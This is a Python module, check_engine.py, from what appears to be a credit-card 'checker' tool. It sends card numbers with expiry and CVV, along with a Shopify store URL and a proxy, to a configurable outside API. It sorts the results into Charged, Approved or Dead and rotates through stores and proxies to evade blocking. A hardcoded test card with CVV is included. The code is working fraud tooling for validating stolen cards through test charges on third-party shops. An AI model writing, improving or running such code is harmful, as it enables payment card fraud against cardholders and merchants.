"""
check_engine.py — Shopify card checking via yzio.app API
All card check calls hit one of the configured API endpoints.
Configurable via owner panel (api_endpoints.json).
"""
import asyncio
import aiohttp
import random
import os
import json
from config import API_ENDPOINTS_FILE, DEFAULT_API_ENDPOINTS

_session_bad_sites: set = set()
_error_log_path = "error.txt"

def clear_session_bad_sites():
    global _session_bad_sites
    _session_bad_sites = set()

def clear_error_log():
    try:
        open(_error_log_path, 'w').close()
    except:
        pass

def _log_error_card(card, reason):
    try:
        with open(_error_log_path, 'a', encoding='utf-8') as f:
            f.write(f"{card}  # {reason[:100]}\n")
    except:
        pass

# ═══════════════════════════════════════════════════════
# API endpoints management
# ═══════════════════════════════════════════════════════
def load_api_endpoints() -> list:
    try:
        with open(API_ENDPOINTS_FILE) as f:
            eps = json.load(f).get('endpoints') or []
            return eps or list(DEFAULT_API_ENDPOINTS)
    except:
        return list(DEFAULT_API_ENDPOINTS)

def save_api_endpoints(endpoints: list):
    with open(API_ENDPOINTS_FILE, 'w') as f:
        json.dump({'endpoints': endpoints}, f, indent=2)

# ═══════════════════════════════════════════════════════
# Result builder
# ═══════════════════════════════════════════════════════
def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', time=None):
    return {
        'status': status, 'message': message, 'card': card,
        'gateway': gateway, 'price': price, 'receipt_url': receipt_url,
        'retry': retryable, 'proxy': proxy, 'time': time,
    }

# ═══════════════════════════════════════════════════════
# API call
# ═══════════════════════════════════════════════════════
async def _try_endpoint(api_url, shop_url, card, proxy_raw):
    timeout = aiohttp.ClientTimeout(total=45)
    async with aiohttp.ClientSession(timeout=timeout) as s:
        params = {"site": shop_url, "cc": card, "proxy": proxy_raw}
        async with s.get(f"{api_url.rstrip('/')}/shopify", params=params) as r:
            if r.status != 200:
                raise RuntimeError(f"HTTP {r.status}")
            data = await r.json()

    status = str(data.get('status', 'ERROR')).upper()

    if status == 'CHARGED':
        return _make_result(card, 'Charged', data.get('message', 'Payment captured'),
                            price       = data.get('amount', data.get('price', '-')),
                            gateway     = data.get('gateway', 'Shopify Payments'),
                            receipt_url = data.get('receipt_url', ''),
                            proxy       = proxy_raw)
    if status == 'APPROVED':
        return _make_result(card, 'Approved', data.get('message', 'Approved'),
                            price   = data.get('amount', data.get('price', '-')),
                            gateway = data.get('gateway', 'Shopify Payments'),
                            proxy   = proxy_raw)
    if status == 'DECLINED':
        return _make_result(card, 'Dead', data.get('message', 'Declined'),
                            gateway   = data.get('gateway', 'Shopify Payments'),
                            retryable = data.get('retryable', False))
    return _make_result(card, 'Dead', data.get('message', 'Checker error'), retryable=True)

# ═══════════════════════════════════════════════════════
# Main check
# ═══════════════════════════════════════════════════════
async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')
    if not proxies:
        return _make_result(card, 'Dead', 'No proxy configured')

    endpoints = load_api_endpoints()
    if not endpoints:
        return _make_result(card, 'Dead', 'No API endpoints configured')

    last_err     = 'Unknown error'
    failed_sites = set()
    MAX_TRIES    = 8

    for attempt in range(MAX_TRIES):
        available = [s for s in sites if s not in failed_sites] or list(sites)
        shop_url  = random.choice(available)
        proxy_raw = (start_proxy if attempt == 0 and start_proxy else random.choice(proxies))
        api_url   = random.choice(endpoints)

        try:
            result = await _try_endpoint(api_url, shop_url, card, proxy_raw)
        except Exception as e:
            last_err = str(e)
            failed_sites.add(shop_url)
            await asyncio.sleep(0.3)
            continue

        if result['status'] in ('Charged', 'Approved'):
            return result
        if result['status'] == 'Dead' and not result.get('retry'):
            return result

        last_err = result.get('message', 'Retryable error')
        if 'step 0' in last_err.lower() or 'no product' in last_err.lower():
            failed_sites.add(shop_url)
        await asyncio.sleep(0.15)

    _log_error_card(card, last_err)
    return _make_result(card, 'Dead', last_err)

# ═══════════════════════════════════════════════════════
# Site / proxy tests
# ═══════════════════════════════════════════════════════
async def test_site(site: str, proxy: str) -> dict:
    test_card = "5154623245618097|03|2032|156"
    try:
        endpoints = load_api_endpoints()
        api_url   = random.choice(endpoints)
        result    = await _try_endpoint(api_url, site, test_card, proxy)
        if result['status'] in ('Charged', 'Approved', 'Dead'):
            return {'site': site, 'status': 'alive'}
        return {'site': site, 'status': 'dead', 'msg': result.get('message', '')[:100]}
    except Exception as e:
        msg = str(e)[:80]
        if 'step' in msg.lower():
            return {'site': site, 'status': 'step_error', 'msg': msg}
        return {'site': site, 'status': 'dead', 'msg': msg}

def _proxy_to_url(proxy: str) -> str:
    p = proxy.strip()
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    parts = p.split(':')
    if len(parts) == 2:
        return f'http://{p}'
    if len(parts) >= 4:
        host, port = parts[0], parts[1]
        rest       = ':'.join(parts[2:])
        mid        = rest.rfind(':')
        user_part  = rest[:mid]
        pw_part    = rest[mid+1:]
        return f'http://{user_part}:{pw_part}@{host}:{port}'
    return f'http://{p}'

async def test_proxy(proxy: str) -> dict:
    proxy_url = _proxy_to_url(proxy)
    test_urls = ['http://httpbin.org/ip', 'http://api.ipify.org', 'http://icanhazip.com']
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        conn    = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            for url in test_urls:
                try:
                    async with s.get(url, proxy=proxy_url, allow_redirects=True) as r:
                        if r.status == 200:
                            return {'proxy': proxy, 'status': 'alive'}
                except Exception:
                    continue
        return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

async def get_proxy_ip(proxy: str):
    proxy_url = _proxy_to_url(proxy)
    if proxy_url.startswith('socks'):
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=proxy_url) as r:
                if r.status == 200:
                    return (await r.text()).strip()
    except Exception:
        pass
    return None
